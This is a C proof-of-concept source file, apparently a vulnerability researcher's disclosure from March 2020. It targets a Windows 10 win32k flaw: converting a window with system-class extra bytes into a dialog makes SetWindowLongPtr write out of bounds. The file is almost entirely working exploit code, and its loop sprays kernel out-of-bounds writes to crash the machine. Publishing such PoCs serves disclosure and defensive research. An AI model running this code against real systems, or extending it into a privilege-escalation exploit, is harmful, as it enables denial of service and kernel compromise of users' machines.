//
// Gil Dabah
// March 2020
// Windows 10 32/64.
// Mismatch in extra bytes pointer (user vs system) use OOB for dialog class.
//

#include <stdio.h>
#include <windows.h>

#define SETDIALOGPTR 0x63

HWND g_hWnd = NULL;
typedef BOOL(APIENTRY* NtUserCallHwndParamPtr)(HWND hWnd, DWORD value, DWORD func);
NtUserCallHwndParamPtr NtUserCallHwndParam = NULL;

int main(int argc, char* argv[])
{
	WNDCLASS wc = { 0 };
	wc.cbWndExtra = 0x28; // Enough for SetDialogPointer class conversion.
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = (LPCSTR)0xc01f; // Allocates a system class size of 0x8.
	RegisterClass(&wc);

	// Spray OOB writes to crash.
	for (int i = 0; i < 1000; i++)
	{
		// The window is now created with system class size of 8. But a dialog shouldn't have one!
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

		NtUserCallHwndParam = (NtUserCallHwndParamPtr)GetProcAddress(GetModuleHandle("win32u"), "NtUserCallHwndParam");

		// Convert the window to dialog.
		NtUserCallHwndParam(g_hWnd, 0, SETDIALOGPTR);

		// SetWindowLong will use the system pointer (which has 8 bytes allocated) and write at offset 0x10,
		// which is OOB of the system class size of this window.
		// The bug is that it uses the system pointer and not the user pointer and doesn't check for offset>=size.
		SetWindowLongPtr(g_hWnd, 0x10, 0x4141414142424242);
	}

	return 0;
}
